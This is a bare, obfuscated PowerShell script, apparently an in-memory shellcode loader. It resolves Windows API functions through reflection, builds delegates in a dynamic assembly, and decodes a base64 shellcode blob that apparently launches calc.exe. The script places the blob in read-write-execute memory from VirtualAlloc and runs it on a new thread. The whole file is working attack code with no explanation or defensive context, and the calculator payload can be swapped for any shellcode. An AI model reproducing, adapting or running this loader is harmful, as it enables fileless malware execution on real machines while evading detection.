function q7yy {
	Param ($wM, $t84YE)		
	$hO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

	return $hO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($hO.GetMethod('GetModuleHandle')).Invoke($null, @($wM)))), $t84YE))
}
function ki_8 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $lHkM,
		[Parameter(Position = 1)] [Type] $mfK = [Void]
	)

	$sO = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$sO.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $lHkM).SetImplementationFlags('Runtime, Managed')
	$sO.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mfK, $lHkM).SetImplementationFlags('Runtime, Managed')

	return $sO.CreateType()
}
[Byte[]]$jwf = [System.Convert]::FromBase64String("6xZbUIhDCVO7DSWGfP/TMcC7EsuBfP/T6OX///9jYWxjLmV4ZQ==")
	
$yUul = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((q7yy kernel32.dll VirtualAlloc), (ki_8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $jwf.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($jwf, 0, $yUul, $jwf.length)
$t99G = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((q7yy kernel32.dll CreateThread), (ki_8 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$yUul,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((q7yy kernel32.dll WaitForSingleObject), (ki_8 @([IntPtr], [Int32]))).Invoke($t99G,0xffffffff) | Out-Null

